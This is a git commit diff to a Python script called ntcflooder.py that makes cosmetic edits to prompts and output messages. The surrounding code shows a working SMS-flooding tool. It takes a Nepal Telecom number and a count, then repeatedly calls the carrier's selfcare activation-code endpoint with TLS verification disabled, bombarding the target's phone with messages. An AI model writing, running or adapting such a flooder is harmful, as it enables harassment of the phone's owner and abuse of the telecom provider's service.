ef3ca88ba0434c0b8095b746327dffe6f806e0c8
Binit Ghimire <thebinitghimire@gmail.com>
2019-03-02 16:43:07 +0545

    Update ntcflooder.py

--- ntcflooder.py
+++ ntcflooder.py
@@ -6,11 +6,11 @@ print('''
 / /\  /  / / / /___|  _| | (_) | (_) | (_| |  __/ |   
 \_\ \/   \/  \____/|_| |_|\___/ \___/ \__,_|\___|_|                                                         
 ''')
-number = int(input('Enter NTC number[+]:'))
-sendnumber = int(input('Enter no. of SMS you want to send[+]:'))
-sendnumber +=1
+number = int(input('Enter NTC number [+]:'))
+sendnumber = int(input('Enter no. of SMS you want to send [+]:'))
+sendnumber += 1
 print("Sending.....")
 for n in range(0,sendnumber):
 	pac.urllib3.disable_warnings()
 	p('https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do',data={'userName':number,'codeType':'2'},verify = False)
-print("Done")
+print("The process has been completed.")
